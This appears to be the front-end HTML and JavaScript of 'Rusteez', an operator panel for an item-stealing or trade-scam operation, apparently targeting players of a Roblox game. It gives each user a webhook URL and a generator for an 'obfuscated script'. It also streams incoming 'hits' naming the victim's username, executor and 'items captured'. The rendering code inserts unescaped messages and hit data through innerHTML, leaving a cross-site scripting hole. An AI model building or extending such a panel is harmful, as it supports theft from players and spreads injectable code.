<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="style.css">
    <title>Rusteez | Panel</title>
</head>
<body>
    <div class="dashboard-container">
        <div class="sidebar">
            <h2 style="color:var(--accent); text-align:center;">RUSTEEZ</h2>
            <nav style="margin-top:20px;">
                <button class="tab-btn active" onclick="openTab(event, 'trade-hits')">💎 Trade Hits</button>
                <button class="tab-btn" onclick="openTab(event, 'messages')">💬 Messages</button>
                <button class="tab-btn" onclick="openTab(event, 'create-script')">📜 Create Script</button>
            </nav>
            <div style="margin-top:auto; padding:10px; background:rgba(0,0,0,0.2); border-radius:8px;">
                <div id="username-display" style="font-weight:bold;">Loading...</div>
                <div style="font-size:0.7em; color:var(--success);">● Online</div>
                <button onclick="logout()" style="width:100%; margin-top:10px; background:var(--danger); border:none; color:white; padding:5px; border-radius:4px; cursor:pointer;">Logout</button>
            </div>
        </div>

        <div class="main-content">
            <div id="trade-hits" class="tab-content active">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <h1>Trade Hits</h1>
                    <code id="webhook-url" style="color:var(--success); font-size:0.8em;">URL...</code>
                </div>
                <div id="hits-container" style="margin-top:20px;">
                    <p style="color:gray;">Awaiting hits...</p>
                </div>
            </div>

            <div id="messages" class="tab-content">
                <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
                    <h1>Messages</h1>
                    <button class="btn-new-msg" onclick="openNewMsgModal()">+ NEW MESSAGE</button>
                </div>
                <div class="chat-container">
                    <div id="message-list"></div>
                </div>
            </div>

            <div id="create-script" class="tab-content">
                <h1>Script Generator</h1>
                <p>Generating obfuscated script for your ID...</p>
            </div>
        </div>
    </div>

    <div id="newMsgModal" class="modal">
        <div class="modal-content">
            <h2 style="margin-top:0;">Send Message</h2>
            <label>Recipient:</label>
            <select id="user-select"><option value="Admin">Admin</option></select>
            <textarea id="modal-msg-content" placeholder="Type your message..."></textarea>
            <div style="display:flex; gap:10px; margin-top:15px;">
                <button onclick="sendModalMessage()" style="background:var(--accent); color:white; border:none; padding:10px; border-radius:5px; flex:1; cursor:pointer;">SEND</button>
                <button onclick="closeNewMsgModal()" style="background:#444; color:white; border:none; padding:10px; border-radius:5px; flex:1; cursor:pointer;">CANCEL</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let currentUser = null;

        async function init() {
            const res = await fetch('/api/user/me');
            currentUser = await res.json();
            document.getElementById('username-display').innerText = currentUser.username;
            document.getElementById('webhook-url').innerText = window.location.origin + "/webhook/" + currentUser.webhook;
            socket.emit('join_room', currentUser.id);
            loadMessages();
        }

        function openTab(evt, tabName) {
            const contents = document.getElementsByClassName("tab-content");
            for (let c of contents) c.classList.remove("active");
            const buttons = document.getElementsByClassName("tab-btn");
            for (let b of buttons) b.classList.remove("active");
            document.getElementById(tabName).classList.add("active");
            evt.currentTarget.classList.add("active");
        }

        // --- GESTION MESSAGES ---
        async function openNewMsgModal() {
            document.getElementById('newMsgModal').style.display = 'flex';
            const res = await fetch('/api/users/list');
            const users = await res.json();
            const select = document.getElementById('user-select');
            select.innerHTML = '<option value="Admin">Admin</option>';
            users.forEach(u => {
                if(u._id !== currentUser.id) select.innerHTML += `<option value="${u._id}">${u.username}</option>`;
            });
        }

        function closeNewMsgModal() { document.getElementById('newMsgModal').style.display = 'none'; }

        async function sendModalMessage() {
            const target = document.getElementById('user-select').value;
            const content = document.getElementById('modal-msg-content').value;
            if(!content) return;
            await fetch('/api/messages/send', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ recipient: target, content: content })
            });
            document.getElementById('modal-msg-content').value = "";
            closeNewMsgModal();
        }

        async function loadMessages() {
            const res = await fetch('/api/messages');
            const messages = await res.json();
            messages.forEach(displayMessage);
        }

        function displayMessage(msg) {
            const list = document.getElementById('message-list');
            const div = document.createElement('div');
            div.className = 'message-entry';
            div.innerHTML = `<small style="color:gray;">${new Date(msg.timestamp).toLocaleTimeString()}</small><br>
                             <strong>${msg.senderName}</strong>: ${msg.content}`;
            list.appendChild(div);
            list.scrollTop = list.scrollHeight;
        }

        socket.on('new_direct_message', displayMessage);

        // --- GESTION HITS ---
        socket.on('receive_message', (data) => {
            const container = document.getElementById('hits-container');
            if(container.innerHTML.includes("Awaiting")) container.innerHTML = "";
            const card = document.createElement('div');
            card.className = 'hit-card';
            card.innerHTML = `<div class="hit-header">MozilOnTop • SAB Hit [ 🌊 ]</div>
                              <div class="hit-section">👤 User: ${data.username || 'N/A'}<br>💻 Exec: ${data.executor || 'N/A'}</div>
                              <div style="color:#00ff00; margin-top:10px;">${data.text || 'Items captured'}</div>`;
            container.prepend(card);
        });

        function logout() {
            document.cookie = "auth_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            window.location.href = "/login";
        }

        init();
    </script>
</body>
</html>
